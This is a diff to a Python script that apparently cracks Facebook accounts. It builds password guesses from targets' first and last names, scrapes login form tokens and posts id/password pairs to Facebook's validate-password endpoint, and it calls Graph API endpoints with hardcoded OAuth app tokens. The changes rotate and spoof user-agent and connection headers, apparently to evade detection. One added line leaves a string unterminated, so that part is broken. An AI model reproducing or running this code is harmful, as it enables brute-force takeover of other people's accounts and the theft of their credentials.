@@ -348,7 +348,7 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not=A?Brand";v="24", "Chromium";v="107", "Google Chrome";v="107"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Davik/2.1.0 (Linux; U; Android 12; V2031 Build/SP1A.210812.003) [FBAN/MessengerLite;FBAV/320.0.0.6.116;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/493902060;FBCR/Namaste;FBMF/vivo;FBBD/vivo;FBDV/V2031;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not=A?Brand";v="24", "Chromium";v="107", "Google Chrome";v="107"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://free.facebook.com/?stype=lo&jlou=AffvDftmt5To1iu1EyYPJow9YjWf5sBizcHFZe352D6OJ-8fOGFuBmvryr2RtnKti1eVRdd46B1fKa7n0lrf2zUoH03MMwlefnpYNOlk33u3lQ&smuh=21668&lh=Ac-wtQ8WtGT9_OF1DlU&ref_component=mbasic_footer&zero_e=2&zero_et=1678164349&_rdc=1&_rdr&refsrc=deprecated')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -463,7 +463,7 @@ def api2(ids,names,passlist):
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'api_key': '882a8490361da98702bf97a021ddc14d',
-                                        'user-agent':'Davik/2.1.0 (Linux; U; Android 4.0.0; Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]',
+                                        'user-agent':'Davik/2.1.0 (Linux; U; Android 12; V2031 Build/SP1A.210812.003) [FBAN/MessengerLite;FBAV/320.0.0.6.116;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/493902060;FBCR/Namaste;FBMF/vivo;FBBD/vivo;FBDV/V2031;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]',
                                         'x-fb-net-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
@@ -535,11 +535,11 @@ def api5(ids,names,passlist):
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(2e4, 5e4)),
-                                        'x-fb-connection-type':'mobile.CTRadioAccessTechnologyLTE',
+                                        'x-fb-connection-type':'unknown
                                         'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(2e4, 5e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(4e7, 4e8)),
+                                        'x-fb-connection-bandwidth':str(random.randint(20000000, 30000000)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
